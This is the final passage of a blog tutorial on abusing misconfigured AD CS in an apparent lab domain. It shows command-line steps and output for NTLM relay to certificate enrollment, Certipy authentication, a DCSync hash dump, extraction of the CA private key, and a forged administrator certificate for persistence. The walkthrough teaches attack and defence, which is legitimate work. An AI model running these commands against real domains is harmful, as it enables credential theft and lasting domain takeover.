<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Authenticating</span> <span class="n">against</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">192.168.100.2</span> <span class="k">as</span> <span class="n">ELSWIXCORP</span><span class="o">/</span><span class="n">DC01</span><span class="err">$</span> <span class="n">SUCCEED</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">SMBD</span><span class="o">-</span><span class="n">Thread</span><span class="o">-</span><span class="mi">6</span> <span class="p">(</span><span class="n">process_request_thread</span><span class="p">):</span> <span class="n">Received</span> <span class="n">connection</span> <span class="kn">from</span><span class="w"> </span><span class="mf">192.168.100.3</span><span class="p">,</span> <span class="n">attacking</span> <span class="n">target</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">192.168.100.2</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">HTTP</span> <span class="n">server</span> <span class="n">returned</span> <span class="n">error</span> <span class="n">code</span> <span class="mi">200</span><span class="p">,</span> <span class="n">treating</span> <span class="k">as</span> <span class="n">a</span> <span class="n">successful</span> <span class="n">login</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Authenticating</span> <span class="n">against</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">192.168.100.2</span> <span class="k">as</span> <span class="n">ELSWIXCORP</span><span class="o">/</span><span class="n">DC01</span><span class="err">$</span> <span class="n">SUCCEED</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Generating</span> <span class="n">CSR</span><span class="o">...</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">CSR</span> <span class="n">generated</span><span class="err">!</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Getting</span> <span class="n">certificate</span><span class="o">...</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Skipping</span> <span class="n">user</span> <span class="n">DC01</span><span class="err">$</span> <span class="n">since</span> <span class="n">attack</span> <span class="n">was</span> <span class="n">already</span> <span class="n">performed</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">GOT</span> <span class="n">CERTIFICATE</span><span class="err">!</span> <span class="n">ID</span> <span class="mi">25</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Writing</span> <span class="n">PKCS</span><span class="c1">#12 certificate to ./DC01$.pfx</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Certificate</span> <span class="n">successfully</span> <span class="n">written</span> <span class="n">to</span> <span class="n">file</span>
</pre></div>
<p>Let’s authenticate using the certificate with <code>Certipy</code>:</p><br/>
<div class="highlight"><pre><span></span><span class="nd">elswix@ubuntu$</span> <span class="n">certipy</span> <span class="n">auth</span> <span class="o">-</span><span class="n">pfx</span> <span class="n">DC01</span>\<span class="err">$</span><span class="o">.</span><span class="n">pfx</span> <span class="o">-</span><span class="n">dc</span><span class="o">-</span><span class="n">ip</span> <span class="mf">192.168.100.2</span>
<span class="n">Certipy</span> <span class="n">v4</span><span class="mf">.8.2</span> <span class="o">-</span> <span class="n">by</span> <span class="n">Oliver</span> <span class="n">Lyak</span> <span class="p">(</span><span class="n">ly4k</span><span class="p">)</span>

<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Using</span> <span class="n">principal</span><span class="p">:</span> <span class="n">dc01</span><span class="err">$</span><span class="nd">@elswixcorp</span><span class="o">.</span><span class="n">local</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Trying</span> <span class="n">to</span> <span class="n">get</span> <span class="n">TGT</span><span class="o">...</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Got</span> <span class="n">TGT</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Saved</span> <span class="n">credential</span> <span class="n">cache</span> <span class="n">to</span> <span class="s1">'dc01.ccache'</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Trying</span> <span class="n">to</span> <span class="n">retrieve</span> <span class="n">NT</span> <span class="nb">hash</span> <span class="k">for</span> <span class="s1">'dc01$'</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Got</span> <span class="nb">hash</span> <span class="k">for</span> <span class="s1">'dc01$@elswixcorp.local'</span><span class="p">:</span> <span class="n">aad3b435b51404eeaad3b435b51404ee</span><span class="p">:</span><span class="mi">962</span><span class="n">d237322da6dadcf566a1a866b9dc4</span>
</pre></div>
<p>Now, with the <code>.ccache</code> file saved by <code>Certipy</code> for <code>DC01$</code>, we can perform a <strong>DCSync</strong>:</p><br/>
<div class="highlight"><pre><span></span><span class="nd">elswix@ubuntu$</span> <span class="n">secretsdump</span><span class="o">.</span><span class="n">py</span> <span class="s1">'elswixcorp.local'</span><span class="o">/</span><span class="s1">'dc01$'</span><span class="o">@</span><span class="s1">'192.168.100.2'</span> <span class="o">-</span><span class="n">hashes</span> <span class="p">:</span><span class="mi">962</span><span class="n">d237322da6dadcf566a1a866b9dc4</span> <span class="o">-</span><span class="n">dc</span><span class="o">-</span><span class="n">ip</span> <span class="mf">192.168.100.2</span>
<span class="n">Impacket</span> <span class="n">v0</span><span class="mf">.11.0</span> <span class="o">-</span> <span class="n">Copyright</span> <span class="mi">2023</span> <span class="n">Fortra</span>

<span class="p">[</span><span class="o">-</span><span class="p">]</span> <span class="n">RemoteOperations</span> <span class="n">failed</span><span class="p">:</span> <span class="n">DCERPC</span> <span class="n">Runtime</span> <span class="n">Error</span><span class="p">:</span> <span class="n">code</span><span class="p">:</span> <span class="mh">0x5</span> <span class="o">-</span> <span class="n">rpc_s_access_denied</span> 
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Dumping</span> <span class="n">Domain</span> <span class="n">Credentials</span> <span class="p">(</span><span class="n">domain</span>\<span class="n">uid</span><span class="p">:</span><span class="n">rid</span><span class="p">:</span><span class="n">lmhash</span><span class="p">:</span><span class="n">nthash</span><span class="p">)</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Using</span> <span class="n">the</span> <span class="n">DRSUAPI</span> <span class="n">method</span> <span class="n">to</span> <span class="n">get</span> <span class="n">NTDS</span><span class="o">.</span><span class="n">DIT</span> <span class="n">secrets</span>
<span class="n">Administrator</span><span class="p">:</span><span class="mi">500</span><span class="p">:</span><span class="n">aad3b435b51404eeaad3b435b51404ee</span><span class="p">:</span><span class="mi">58</span><span class="n">a478135a93ac3bf058a5ea0e8fdb71</span><span class="p">:::</span>
<span class="o">...</span><span class="p">[</span><span class="n">snip</span><span class="p">]</span><span class="o">...</span>
<span class="n">WORKSTATION01</span><span class="err">$</span><span class="p">:</span><span class="n">aes256</span><span class="o">-</span><span class="n">cts</span><span class="o">-</span><span class="n">hmac</span><span class="o">-</span><span class="n">sha1</span><span class="o">-</span><span class="mi">96</span><span class="p">:</span><span class="mi">248</span><span class="n">afa8591494c7665a7faf5fb7b08ffeea841e331c4b1abde968d400b37a3f7</span>
<span class="n">WORKSTATION01</span><span class="err">$</span><span class="p">:</span><span class="n">aes128</span><span class="o">-</span><span class="n">cts</span><span class="o">-</span><span class="n">hmac</span><span class="o">-</span><span class="n">sha1</span><span class="o">-</span><span class="mi">96</span><span class="p">:</span><span class="n">e2ab8c2d83feaaf3d0348990a7076a2d</span>
<span class="n">WORKSTATION01</span><span class="err">$</span><span class="p">:</span><span class="n">des</span><span class="o">-</span><span class="n">cbc</span><span class="o">-</span><span class="n">md5</span><span class="p">:</span><span class="n">d6f1235dabdf32f8</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Cleaning</span> <span class="n">up</span><span class="o">...</span>
</pre></div>
<h3>Domain Persistence</h3><br/>
<p>Once we compromise the domain, you'll likely want to maintain access, even if passwords are reset or similar actions are taken. One approach is to extract the CA's private key and then forge your own certificates.</p><br/>
<p>Remember that when generating a certificate, the CA signs it using its private key. This means that if we steal this private key, we can sign our own certificates with arbitrary information, making them valid for authentication as high-privileged users.</p><br/>
<p>This can be done both locally and remotely. I'll demonstrate the remote method using <code>certipy</code>. Feel free to explore how to do it locally—spoiler: tools such as Mimikatz or SharpDPAPI can help.</p><br/>
<p>First, using the administrator credentials we obtained through DCSync, I'll extract the CA's private key using <code>Certipy</code>:</p><br/>
<div class="highlight"><pre><span></span><span class="nd">elswix@ubuntu$</span> <span class="n">certipy</span> <span class="n">ca</span> <span class="o">-</span><span class="n">backup</span> <span class="o">-</span><span class="n">ca</span> <span class="s1">'elswixcorp-DC02-CA'</span> <span class="o">-</span><span class="n">u</span> <span class="n">administrator</span> <span class="o">-</span><span class="n">hashes</span> <span class="p">:</span><span class="mi">58</span><span class="n">a478135a93ac3bf058a5ea0e8fdb71</span> <span class="o">-</span><span class="n">target</span> <span class="mf">192.168.100.2</span>
<span class="n">Certipy</span> <span class="n">v4</span><span class="mf">.8.2</span> <span class="o">-</span> <span class="n">by</span> <span class="n">Oliver</span> <span class="n">Lyak</span> <span class="p">(</span><span class="n">ly4k</span><span class="p">)</span>

<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Creating</span> <span class="n">new</span> <span class="n">service</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Creating</span> <span class="n">backup</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Retrieving</span> <span class="n">backup</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Got</span> <span class="n">certificate</span> <span class="ow">and</span> <span class="n">private</span> <span class="n">key</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Saved</span> <span class="n">certificate</span> <span class="ow">and</span> <span class="n">private</span> <span class="n">key</span> <span class="n">to</span> <span class="s1">'elswixcorp-DC02-CA.pfx'</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Cleaning</span> <span class="n">up</span>
</pre></div>
<p>Great! We've successfully extracted the CA's certificate and private key. Now, let's forge a new certificate for the administrator user:</p><br/>
<div class="highlight"><pre><span></span><span class="n">certipy</span> <span class="n">forge</span> <span class="o">-</span><span class="n">upn</span> <span class="n">administrator</span> <span class="o">-</span><span class="n">ca</span><span class="o">-</span><span class="n">pfx</span> <span class="n">elswixcorp</span><span class="o">-</span><span class="n">DC02</span><span class="o">-</span><span class="n">CA</span><span class="o">.</span><span class="n">pfx</span>
<span class="n">Certipy</span> <span class="n">v4</span><span class="mf">.8.2</span> <span class="o">-</span> <span class="n">by</span> <span class="n">Oliver</span> <span class="n">Lyak</span> <span class="p">(</span><span class="n">ly4k</span><span class="p">)</span>

<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Saved</span> <span class="n">forged</span> <span class="n">certificate</span> <span class="ow">and</span> <span class="n">private</span> <span class="n">key</span> <span class="n">to</span> <span class="s1">'administrator_forged.pfx'</span>
</pre></div>
<p>Now, we can use this forged certificate to authenticate as <code>administrator</code>:</p><br/>
<div class="highlight"><pre><span></span><span class="nd">elswix@ubuntu$</span> <span class="n">certipy</span> <span class="n">auth</span> <span class="o">-</span><span class="n">pfx</span> <span class="n">administrator_forged</span><span class="o">.</span><span class="n">pfx</span> <span class="o">-</span><span class="n">domain</span> <span class="n">elswixcorp</span><span class="o">.</span><span class="n">local</span> <span class="o">-</span><span class="n">dc</span><span class="o">-</span><span class="n">ip</span> <span class="mf">192.168.100.2</span>
<span class="n">Certipy</span> <span class="n">v4</span><span class="mf">.8.2</span> <span class="o">-</span> <span class="n">by</span> <span class="n">Oliver</span> <span class="n">Lyak</span> <span class="p">(</span><span class="n">ly4k</span><span class="p">)</span>

<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Using</span> <span class="n">principal</span><span class="p">:</span> <span class="n">administrator</span><span class="nd">@elswixcorp</span><span class="o">.</span><span class="n">local</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Trying</span> <span class="n">to</span> <span class="n">get</span> <span class="n">TGT</span><span class="o">...</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Got</span> <span class="n">TGT</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Saved</span> <span class="n">credential</span> <span class="n">cache</span> <span class="n">to</span> <span class="s1">'administrator.ccache'</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Trying</span> <span class="n">to</span> <span class="n">retrieve</span> <span class="n">NT</span> <span class="nb">hash</span> <span class="k">for</span> <span class="s1">'administrator'</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Got</span> <span class="nb">hash</span> <span class="k">for</span> <span class="s1">'administrator@elswixcorp.local'</span><span class="p">:</span> <span class="n">aad3b435b51404eeaad3b435b51404ee</span><span class="p">:</span><span class="mi">58</span><span class="n">a478135a93ac3bf058a5ea0e8fdb71</span>
</pre></div>
<h3>Conclusion</h3><br/>
<p>Active Directory Certificate Services (AD CS) is a powerful and feature-rich PKI implementation that offers many benefits to enterprise environments. However, it is surprisingly easy to misconfigure, making its deployment potentially dangerous in the hands of inexperienced administrators. In this article, we focused on domain authentication with AD CS—how it works, and how it can be exploited when improperly configured.</p><br/>
<p>In upcoming articles, particularly in Part 2, we’ll explore more recent techniques ranging from ESC9 to ESC15. It's worth noting that many of the techniques demonstrated here are no longer exploitable following the <strong>Certifried vulnerability patch in 2022</strong>, which we will also discuss in detail. That update introduced several important security improvements to AD CS, mitigating various attacks. Furthermore, starting in February 2025, a new update enforces strong certificate mapping by default, adding yet another layer of protection.</p><br/>
<p>Nonetheless, understanding how these systems were previously abused is essential for understanding how they can still be exploited today—and more importantly, how to defend against such attacks.</p><br/>
<h3>References</h3><br/>
<p><a href="https://posts.specterops.io/certified-pre-owned-d95910965cd2">https://posts.specterops.io/certified-pre-owned-d95910965cd2</a>
<br/>
<a href="https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf">https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf</a>
<br/>
<a href="https://www.thehacker.recipes/ad/movement/adcs/certificate-templates">https://www.thehacker.recipes/ad/movement/adcs/certificate-templates</a>
<br/>
<a href="https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.html">https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.html</a>
<br/>
<a href="https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/ad-certificates/account-persistence.html">https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/ad-certificates/account-persistence.html</a></p><br/>
                        </div>
                    </div>
                </section>

            </main>
        </div>
    </div>
    <script src="/js/sidebarToggle.js"></script>
    <script src="/js/fixMobileImages.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/js/bootstrap.bundle.min.js"></script>
</body>
</html>
